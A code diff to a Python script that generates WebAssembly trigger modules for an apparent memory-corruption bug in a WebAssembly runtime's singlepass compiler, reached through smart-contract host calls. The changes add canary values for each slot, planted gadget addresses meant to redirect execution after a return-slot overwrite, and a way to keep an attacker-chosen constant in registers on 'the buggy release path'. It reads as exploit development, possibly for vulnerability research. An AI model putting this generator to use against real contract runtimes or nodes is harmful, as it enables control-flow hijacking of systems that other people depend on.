@@ -116,7 +116,7 @@ def gen_holder(outdir, dummy=0, staged=10):
 
 
 def gen_trigger(outdir, offset, iters, dense=False, live="load", plants="uniform", plant_addr=None, dense_tail=0, frame32=0,
-                call_kind="db_read"):
+                call_kind="db_read", plant_values=None, then_val=None):
     if call_kind == "query":
         # host call = contract-to-contract Smart query; the Go querier callback runs
         # while this (trigger) execution is suspended -> observability hook.
@@ -131,14 +131,24 @@ def gen_trigger(outdir, offset, iters, dense=False, live="load", plants="uniform
         call_import = '  (import "env" "db_read" (func $host (param i32) (result i32)))'
         call_arg = "(i32.const 16)"
         extra_data = []
-    if plants == "gadget" and plant_addr is not None:
+    if plant_values:
+        # per-slot canaries (hex list, applied to the register-resident slots k0..k5,
+        # rest filled with the last value) -> a consumed canary identifies its slot
+        seq = list(plant_values)
+        vals = b"".join(struct.pack("<Q", seq[k % len(seq)]) for k in range(LIVE))
+    elif plants == "gadget" and plant_addr is not None:
         # aimed pivot: every planted slot = a chosen fixed code address (e.g. a ud2
         # gadget in the non-PIE harness binary) -> a return-slot overwrite transfers
         # execution there (SIGILL with PC == the gadget proves the aimed pivot)
         vals = struct.pack("<Q", plant_addr) * LIVE
     elif plants == "distinct":
         # per-slot distinct pivot values: a crash PC reveals WHICH slot landed
-        vals = b"".join(struct.pack("<Q", 0x0041414100000000 + k) for k in range(LIVE))
+        # per-slot distinct pivot values: a crash PC reveals WHICH slot landed.
+        # NOTE: canonical-but-unmapped (0x0000414100000000+k) — a control transfer
+        # (ret/jmp/call) to such a value faults AT THE TARGET (PC=0x41410000000k,
+        # visible), whereas the older non-canonical 0x0041... form faults at the
+        # branching instruction (PC stays in the consumer -> invisible).
+        vals = b"".join(struct.pack("<Q", 0x0000414100000000 + k) for k in range(LIVE))
     else:
         vals = b"".join(struct.pack("<Q", GADGET) for _ in range(LIVE))
     lines = [
@@ -176,10 +186,16 @@ def gen_trigger(outdir, offset, iters, dense=False, live="load", plants="uniform
     else:
         for k in range(LIVE):
             lines.append(f"        (i64.load (i32.const {64 + 8 * k}))")
+    then_expr = "(i64.add (i64.extend_i32_u (local.get $i)) (i64.const 0x12345678))"
+    if then_val is not None:
+        # computed-valued then-result that evaluates EXACTLY to then_val: C + (i & 0).
+        # singlepass does no algebraic folding, so the value stays register-backed
+        # (required for the buggy release path) while carrying an attacker constant.
+        then_expr = ("(i64.add (i64.const 0x%x) (i64.and (i64.extend_i32_u (local.get $i)) (i64.const 0)))" % then_val)
     lines += [
         "        (i32.load (i32.const 0))",
         "        (if (result i64)",
-        "          (then (i64.add (i64.extend_i32_u (local.get $i)) (i64.const 0x12345678)))",
+        f"          (then {then_expr})",
         "          (else (i64.extend_i32_u (local.get $i))))",
         "        drop",
     ]
@@ -268,12 +284,18 @@ def main():
                     help="trigger loop calls query_chain (observability) instead of db_read")
     ap.add_argument("--staged", type=int, default=10,
                     help="number of holder staged locals (more => forced native frame growth)")
+    ap.add_argument("--plant-values", default=None,
+                    help="comma-separated per-slot canary values (hex), overrides --plants")
+    ap.add_argument("--then-val", default=None,
+                    help="make the drift-site computed then-result evaluate to this exact 64-bit hex constant")
     args = ap.parse_args()
     os.makedirs(args.outdir, exist_ok=True)
     call_kind = "query" if args.call_query else "db_read"
+    pv = [int(x, 16) for x in args.plant_values.split(",")] if args.plant_values else None
+    tv = int(args.then_val, 16) if args.then_val else None
     gen_holder(args.outdir, args.dummy, args.staged)
     gen_trigger(args.outdir, args.offset, args.iters, args.dense, args.live, args.plants,
-                args.plant_addr, args.dense_tail, args.frame32, call_kind)
+                args.plant_addr, args.dense_tail, args.frame32, call_kind, pv, tv)
     gen_benign(args.outdir)
 
 
